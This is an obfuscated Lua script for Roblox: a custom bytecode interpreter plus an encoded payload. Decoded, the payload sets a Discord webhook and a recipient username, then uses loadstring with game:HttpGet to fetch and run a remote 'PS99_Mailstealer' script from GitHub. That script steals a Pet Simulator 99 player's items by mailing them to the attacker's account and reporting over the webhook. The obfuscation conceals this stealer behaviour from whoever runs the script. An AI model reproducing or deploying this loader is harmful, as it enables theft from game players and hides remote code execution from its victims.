local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==79) then local v86=0;while true do if (v86==0) then v19=v0(v3(v30,1,1));return "";end end else local v87=0;local v88;while true do if (v87==0) then v88=v2(v0(v30,16));if v19 then local v128=0;local v129;while true do if (1==v128) then return v129;end if (v128==0) then v129=v5(v88,v19);v19=nil;v128=1;end end else return v88;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v89=(v31/((1 + 1)^(v32-(2 -1))))%((5 -3)^(((v33-(1 -(0 + 0))) -(v32-(2 -1))) + (620 -(555 + 64)))) ;return v89-(v89%1) ;else local v90=2^(v32-(932 -(857 + (951 -(282 + 595))))) ;return (((v31%(v90 + v90))>=v90) and (569 -(367 + 201))) or (927 -(214 + 713)) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=0;local v36;local v37;while true do if (v35==((1754 -(32 + 85)) -(1523 + 114))) then v36,v37=v1(v16,v18,v18 + 2 + 0 );v18=v18 + (2 -0) ;v35=1066 -(68 + 997) ;end if (v35==(1271 -(226 + 1044))) then return (v37 * (1114 -858)) + v36 ;end end end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + 3 );v18=v18 + 4 + (0 -0) ;return (v41 * (3720433 + (23970033 -10913250))) + (v40 * (66493 -(892 + 65))) + (v39 * ((960 -(87 + 263)) -354)) + v38 ;end local function v24() local v42=(78 + 102) -((118 -51) + 113) ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(3 + 0)) then if (v47==((438 -(145 + 293)) -0)) then if (v46==0) then return v48 * (0 + 0) ;else v47=3 -2 ;v45=0;end elseif (v47==(2999 -(802 + (580 -(44 + 386))))) then return ((v46==(0 -(1486 -(998 + 488)))) and (v48 * (((1 + 0) -(0 + 0))/((772 -(201 + 571)) + 0)))) or (v48 * NaN) ;end return v8(v48,v47-(2161 -(116 + 1022)) ) * (v45 + (v46/((999 -((3809 -2894) + 82))^(147 -95)))) ;end if (v42==2) then v47=v20(v44,13 + 8 ,40 -9 );v48=((v20(v44,1219 -(1069 + 118) )==(2 -1)) and  -1) or ((1 + 0) -(0 -0)) ;v42=1 + 2 ;end if (v42==(0 -0)) then v43=v23();v44=v23();v42=1;end if (v42==(1 + 0)) then v45=792 -((1306 -938) + 423) ;v46=(v20(v44,3 -2 ,38 -(10 + 8) ) * ((7 -5)^(474 -(416 + 26)))) + v43 ;v42=6 -(863 -(814 + 45)) ;end end end local function v25(v49) local v50=0 -0 ;local v51;local v52;while true do if (v50==(1 + (767 -(745 + 21)))) then v52={};for v118=1 + 0 , #v51 do v52[v118]=v2(v1(v3(v51,v118,v118)));end v50=3;end if (v50==(885 -(261 + 624))) then v51=nil;if  not v49 then local v124=(1913 -(1789 + 124)) -0 ;while true do if (v124==(1080 -(1020 + 60))) then v49=v23();if (v49==(1423 -(630 + 793))) then return "";end break;end end end v50=3 -2 ;end if (v50==(14 -11)) then return v6(v52);end if (v50==(1 + 0 + 0)) then v51=v3(v16,v18,(v18 + v49) -(3 -(5 -3)) );v18=v18 + v49 ;v50=1749 -(760 + 987) ;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v53=(function() return function(v91,v92,v93,v94,v95,v96,v97,v98) local v91=(function() return 0 -0 ;end)();local v92=(function() return;end)();local v94=(function() return;end)();while true do if (v91==(1824 -(1195 + 629))) then local v125=(function() return 0 -0 ;end)();local v126=(function() return;end)();while true do if (0==v125) then v126=(function() return 0;end)();while true do if (v126~=0) then else v92=(function() return v93();end)();v94=(function() return nil;end)();v126=(function() return 1;end)();end if ((242 -(187 + 54))==v126) then v91=(function() return  #"]";end)();break;end end break;end end end if (v91== #"}") then if (v92== #"/") then v94=(function() return v93()~=0 ;end)();elseif (v92==(782 -(162 + 618))) then v94=(function() return v95();end)();elseif (v92== #"91(") then v94=(function() return v96();end)();end v97[v98]=(function() return v94;end)();break;end end return v91,v92,v93,v94,v95,v96,v97,v98;end;end)();local v54=(function() return function(v99,v100,v101,v102,v103,v104,v105,v106,v107) local v108=(function() return 0;end)();local v99=(function() return;end)();local v100=(function() return;end)();while true do local v117=(function() return 0;end)();while true do if (v117~=0) then else if (v108~=1) then else local v130=(function() return 0 + 0 ;end)();while true do if (v130==0) then local v139=(function() return 0;end)();while true do if (0~=v139) then else while true do if (v99~=(0 + 0)) then else v100=(function() return v101();end)();if (v102(v100, #"<", #"|")==0) then local v193=(function() return 0;end)();local v194=(function() return;end)();local v195=(function() return;end)();local v196=(function() return;end)();while true do if (v193==0) then local v201=(function() return 0 -0 ;end)();while true do if (v201==(1 -0)) then v193=(function() return 1;end)();break;end if ((0 + 0)==v201) then v194=(function() return v102(v100,2, #"xxx");end)();v195=(function() return v102(v100, #".com",1642 -(1373 + 263) );end)();v201=(function() return 1001 -(451 + 549) ;end)();end end end if (v193~=1) then else local v202=(function() return 0;end)();local v203=(function() return;end)();while true do if (v202==0) then v203=(function() return 0 + 0 ;end)();while true do if (v203~=(1 -0)) then else v193=(function() return 2;end)();break;end if (0==v203) then local v208=(function() return 0 -0 ;end)();while true do if (1==v208) then v203=(function() return 1;end)();break;end if (v208==0) then v196=(function() return {v103(),v103(),nil,nil};end)();if (v194==(1384 -(746 + 638))) then local v209=(function() return 0 + 0 ;end)();local v210=(function() return;end)();while true do if (v209~=(0 -0)) then else v210=(function() return 341 -(218 + 123) ;end)();while true do if (v210==0) then v196[ #"19("]=(function() return v103();end)();v196[ #"asd1"]=(function() return v103();end)();break;end end break;end end elseif (v194== #"{") then v196[ #"19("]=(function() return v104();end)();elseif (v194==2) then v196[ #"xxx"]=(function() return v104() -(2^(1597 -(1535 + 46))) ;end)();elseif (v194== #"nil") then local v215=(function() return 0 + 0 ;end)();local v216=(function() return;end)();while true do if (v215~=0) then else v216=(function() return 0;end)();while true do if (v216~=(0 + 0)) then else v196[ #"-19"]=(function() return v104() -((562 -(306 + 254))^(1 + 15)) ;end)();v196[ #"xnxx"]=(function() return v103();end)();break;end end break;end end end v208=(function() return 1;end)();end end end end break;end end end if (v193~=3) then else if (v102(v195, #"asd", #"asd")~= #"{") then else v196[ #"http"]=(function() return v105[v196[ #"0313"]];end)();end v106[v107]=(function() return v196;end)();break;end if (v193~=2) then else if (v102(v195, #"~", #" ")~= #":") then else v196[2]=(function() return v105[v196[3 -1 ]];end)();end if (v102(v195,1469 -(899 + 568) ,2 + 0 )~= #"[") then else v196[ #"asd"]=(function() return v105[v196[ #"19("]];end)();end v193=(function() return 3;end)();end end end break;end end return v99,v100,v101,v102,v103,v104,v105,v106,v107;end end end end end if (v108==(0 -0)) then local v131=(function() return 603 -(268 + 335) ;end)();local v132=(function() return;end)();while true do if (v131==0) then v132=(function() return 290 -(60 + 230) ;end)();while true do if (v132~=(572 -(426 + 146))) then else v99=(function() return 0;end)();v100=(function() return nil;end)();v132=(function() return 1;end)();end if (v132~=(1 + 0)) then else v108=(function() return 1;end)();break;end end break;end end end break;end end end end;end)();local v55=(function() return function(v109,v110,v111) local v112=(function() return 1456 -(282 + 1174) ;end)();local v113=(function() return;end)();while true do if (v112~=0) then else v113=(function() return 811 -(569 + 242) ;end)();while true do if (v113==0) then local v133=(function() return 0 -0 ;end)();while true do if (0~=v133) then else v109[v110-#"|" ]=(function() return v111();end)();return v109,v110,v111;end end end end break;end end end;end)();local v56=(function() return {};end)();local v57=(function() return {};end)();local v58=(function() return {};end)();local v59=(function() return {v56,v57,nil,v58};end)();local v60=(function() return v23();end)();local v61=(function() return {};end)();for v69= #"[",v60 do FlatIdent_39764,Type,v21,Cons,v24,v25,v61,v69=(function() return v53(FlatIdent_39764,Type,v21,Cons,v24,v25,v61,v69);end)();end v59[ #"91("]=(function() return v21();end)();for v70= #"{",v23() do FlatIdent_6D4CB,Descriptor,v21,v20,v22,v23,v61,v56,v70=(function() return v54(FlatIdent_6D4CB,Descriptor,v21,v20,v22,v23,v61,v56,v70);end)();end for v71= #"/",v23() do v57,v71,v28=(function() return v55(v57,v71,v28);end)();end return v59;end local function v29(v63,v64,v65) local v66=v63[(1206 -(902 + 303)) + 0 ];local v67=v63[1026 -(706 + 318) ];local v68=v63[(2753 -1499) -((1736 -1015) + 530) ];return function(...) local v72=v66;local v73=v67;local v74=v68;local v75=v27;local v76=1272 -(945 + 326) ;local v77= -(2 -(1 + 0));local v78={};local v79={...};local v80=v12("#",...) -(2 -1) ;local v81={};local v82={};for v114=(2390 -(1121 + 569)) -(271 + 429) ,v80 do if ((4615==4615) and (v114>=v74)) then v78[v114-v74 ]=v79[v114 + (4 -3) ];else v82[v114]=v79[v114 + 1 + 0 ];end end local v83=(v80-v74) + 1 + 0 ;local v84;local v85;while true do v84=v72[v76];v85=v84[1501 -(1408 + 92) ];if ((v85<=(1097 -(461 + (839 -(22 + 192))))) or (3790==500)) then if (v85<=(1293 -(993 + 295))) then if (v85<=2) then if (v85<=(0 + 0)) then local v134=0 + 0 ;local v135;while true do if ((((1854 -(483 + 200)) -(418 + 753))==v134) or (2110<=332)) then v135=v84[1 + 1 ];v82[v135]=v82[v135](v13(v82,v135 + 1 + 0 ,v77));break;end end elseif ((3686>3172) and (v85>((1464 -(1404 + 59)) + 0))) then v82[v84[1132 -(369 + 761) ]]=v65[v84[1 + 2 ]];else v82[v84[2 -0 ]]=v65[v84[5 -2 ]];end elseif (v85<=((1455 -923) -(406 + 123))) then for v141=v84[1771 -(1749 + 20) ],v84[1 + 2 ] do v82[v141]=nil;end elseif (v85==(1326 -(1249 + 73))) then v82[v84[2]]=v84[(2 -0) + 1 ]~=(1145 -(466 + (1444 -(468 + 297)))) ;else v65[v84[6 -3 ]]=v82[v84[338 -(144 + 192) ]];end elseif ((89<221) and (v85<=(224 -((604 -(334 + 228)) + 174)))) then if ((2054>=1421) and (v85<=(5 + 1))) then v76=v84[(26 -18) -5 ];elseif (v85>(6 + 1)) then v76=v84[2 + 1 ];else v82[v84[1506 -(363 + 1141) ]]=v84[1903 -(106 + 1794) ];end elseif ((v85<=(3 + 6)) or (4474<820)) then do return;end elseif ((692<3058) and (v85==((6 -3) + (12 -5)))) then do return;end else v65[v84[8 -5 ]]=v82[v84[2]];end elseif (v85<=(13 + 4)) then if ((v85<=(37 -23)) or (3254==1655)) then if (((4279>=2882) and (v85<=(126 -(4 + 110)))) or (1296==4910)) then if ((v82[v84[1977 -(1913 + 62) ]]==v84[588 -(57 + 527) ]) or (2029>=3521)) then v76=v76 + (1428 -(41 + 1386)) ;else v76=v84[106 -(17 + 25 + 61) ];end elseif ((3368==3368) and (v85==((245 -(141 + 95)) + 4))) then v82[v84[3 -1 ]]=v84[8 -5 ];else for v179=v84[(166 + 2) -(122 + 44) ],v84[5 -2 ] do v82[v179]=nil;end end elseif ((v85<=(49 -34)) or (2037>=4642)) then local v137=v84[2 + (0 -0) ];v82[v137]=v82[v137](v13(v82,v137 + (305 -(244 + 60)) ,v77));elseif (v85==(3 + 13)) then if (v82[v84[3 -1 ]]==v84[4]) then v76=v76 + (1002 -(938 + 63)) ;else v76=v84[68 -(30 + 35) ];end else local v158=0;local v159;local v160;local v161;local v162;while true do if ((2643<3815) and (v158==1)) then v77=(v161 + v159) -(1126 -(936 + 189)) ;v162=0 + 0 ;v158=1259 -(1043 + 214) ;end if (v158==(7 -5)) then for v189=v159,v77 do local v190=0;while true do if ((1212 -(323 + 889))==v190) then v162=v162 + (2 -(2 -1)) ;v82[v189]=v160[v162];break;end end end break;end if (v158==(580 -(361 + 219))) then v159=v84[322 -(53 + 267) ];v160,v161=v75(v82[v159](v13(v82,v159 + 1 + 0 ,v84[416 -(15 + 398) ])));v158=983 -(5 + 13 + 964) ;end end end elseif ((1720<4458) and (v85<=(75 -55))) then if (v85<=((30 -19) + 7)) then v82[v84[2 + 0 + 0 ]]();elseif ((1913>493) and (v85>(869 -(20 + 830)))) then local v163=v84[2 + 0 ];local v164=v82[v84[129 -(61 + 55 + 10) ]];v82[v163 + 1 + 0 ]=v164;v82[v163]=v164[v84[742 -(542 + 196) ]];else local v168=0 -0 ;local v169;local v170;local v171;local v172;while true do if ((4755>3428) and (v168==(0 + 0))) then v169=v84[2 + (0 -0) ];v170,v171=v75(v82[v169](v13(v82,v169 + (2 -1) ,v84[2 + 1 ])));v168=2 -(1 + 0) ;end if ((v168==(2 -1)) or (436>3021)) then v77=(v171 + v169) -(1552 -(1126 + 425)) ;v172=(568 -(92 + 71)) -(118 + 287) ;v168=1191 -(449 + 740) ;end if ((713<=847) and (v168==(7 -(3 + 2)))) then for v191=v169,v77 do local v192=872 -(826 + 46) ;while true do if ((1121 -((198 -80) + 1003))==v192) then v172=v172 + (948 -(245 + 702)) ;v82[v191]=v170[v172];break;end end end break;end end end elseif (v85<=(61 -40)) then v82[v84[379 -(142 + 235) ]]();elseif ((1381<=2369) and (v85==(99 -77))) then local v173=0 + 0 ;local v174;local v175;while true do if ((2154<=4031) and (v173==((2663 -(574 + 191)) -(260 + 1638)))) then v174=v84[442 -(382 + 48 + 10) ];v175=v82[v84[980 -(553 + 424) ]];v173=1 -0 ;end if (1==v173) then v82[v174 + 1 + 0 ]=v175;v82[v174]=v175[v84[4 + (0 -0) ]];break;end end else v82[v84[2 + 0 ]]=v84[2 + 1 ]~=(0 + 0) ;end v76=v76 + (2 -1) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!0B3O00028O00026O00F03F03073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3132372O343234313431372O303932373536392F5035634F68714C697664347472694A6A39764A424D6A773647646C57366D7661423735446149527A36356D50744A325672637954326C44556D6F434C6A7A39672O364E48030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034D3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4B692O75502F50532O395F4D61696C737465616C65722F6D61696E2F4D61696C537465616C65722E6C756103083O00557365726E616D6503073O003372302O723331030A3O004C6F61645363722O656E001C3O0012073O00014O0003000100013O00260C3O0002000100010004063O00020001001207000100013O00260C00010011000100020004063O00110001001207000200043O00120B000200033O001201000200053O001201000300063O002014000300030007001207000500084O0013000300056O00023O00022O00150002000100010004063O001B000100260C00010005000100010004063O000500010012070002000A3O00120B000200094O0017000200013O00120B0002000B3O001207000100023O0004063O000500010004063O001B00010004063O000200012O00093O00017O00",v9(),...);